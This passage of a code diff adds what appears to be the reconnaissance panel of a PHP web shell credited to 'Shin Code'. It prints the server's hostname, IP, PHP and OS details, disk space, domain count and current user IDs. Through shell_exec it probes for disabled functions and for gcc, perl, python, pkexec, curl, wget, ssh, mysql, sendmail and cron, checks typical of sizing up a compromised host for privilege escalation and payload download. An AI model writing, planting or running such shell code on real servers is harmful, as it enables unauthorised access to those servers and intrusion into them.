+                return round($bytes, $precision) . ' ' . $units[$pow];
+            }
+            ?>
+
+            <ul class="info-list">
+                <li>Hostname: <?php echo @gethostname(); ?></li>
+                <?php if (isset($_SERVER['SERVER_ADDR'])) : ?>
+                    <li>IP Address: <?php echo $_SERVER['SERVER_ADDR']; ?></li>
+                <?php endif; ?>
+                <li>PHP Version: <?php echo @phpversion(); ?></li>
+                <li>Server Software: <?php echo $_SERVER['SERVER_SOFTWARE']; ?></li>
+                <?php if (function_exists('disk_total_space')) : ?>
+                    <li>HDD Total Space: <?php echo @formatBytes(disk_total_space('/')); ?></li>
+                    <li>HDD Free Space: <?php echo @formatBytes(disk_free_space('/')); ?></li>
+                <?php endif; ?>
+                <li>Total Domains in Server: <?php echo $domainCount; ?></li>
+                <li>System: <?php echo @php_uname(); ?></li>
+            </ul>
+        </div>
+
+        <div class="info-container">
+            <h2>System Info</h2>
+            <ul class="info-list">
+                <?php
+                $features = [
+                    'Safe Mode' => ini_get('safe_mode') ? 'Enabled' : 'Disabled',
+                    'Disable Functions' => ini_get('disable_functions'),
+                    'GCC' => function_exists('shell_exec') && shell_exec('gcc --version') ? 'On' : 'Off',
+                    'Perl' => function_exists('shell_exec') && shell_exec('perl --version') ? 'On' : 'Off',
+                    'Python Version' => ($pythonVersion = shell_exec('python --version')) ? 'On (' . $pythonVersion . ')' : 'Off',
+                    'PKEXEC Version' => ($pkexecVersion = shell_exec('pkexec --version')) ? 'On (' . $pkexecVersion . ')' : 'Off',
+                    'Curl' => function_exists('shell_exec') && shell_exec('curl --version') ? 'On' : 'Off',
+                    'Wget' => function_exists('shell_exec') && shell_exec('wget --version') ? 'On' : 'Off',
+                    'Mysql' => function_exists('shell_exec') && shell_exec('mysql --version') ? 'On' : 'Off',
+                    'Ftp' => function_exists('shell_exec') && shell_exec('ftp --version') ? 'On' : 'Off',
+                    'Ssh' => function_exists('shell_exec') && shell_exec('ssh --version') ? 'On' : 'Off',
+                    'Mail' => function_exists('shell_exec') && shell_exec('mail --version') ? 'On' : 'Off',
+                    'cron' => function_exists('shell_exec') && shell_exec('cron --version') ? 'On' : 'Off',
+                    'SendMail' => function_exists('shell_exec') && shell_exec('sendmail --version') ? 'On' : 'Off',
+                ];
+                ?>
+
+                <label for="feature-select">Select Feature:</label>
+                <select id="feature-select">
+                    <?php foreach ($features as $feature => $status) : ?>
+                        <option value="<?php echo $feature; ?>"><?php echo $feature . ': ' . $status; ?></option>
+                    <?php endforeach; ?>
+                </select>
+            </ul>
+        </div>
+
+        <div class="info-container">
+            <h2>User Info</h2>
+            <ul class="info-list">
+                <li>Username: <?php echo @get_current_user(); ?></li>
+                <li>User ID: <?php echo @getmyuid(); ?></li>
+                <li>Group ID: <?php echo @getmygid(); ?></li>
+            </ul>
+        </div>
+    </div>
+</div>
+    <script>
+        function toggleOptionsMenu() {
+            var optionsMenu = document.getElementById('optionsMenu');
+            optionsMenu.classList.toggle('show');
+        }
+        
+        function toggleSidebar() {
+            var sidebar = document.getElementById('sidebar');
+            sidebar.classList.toggle('open');
+        }
+    </script>
+</div>
+<div class="footer">
+    <p>&copy; <?php echo date("Y"); ?> <a href="https://www.blog-gan.org/">Coded By</a> Shin Code.</p>
+</div>
 </body>
+</html>
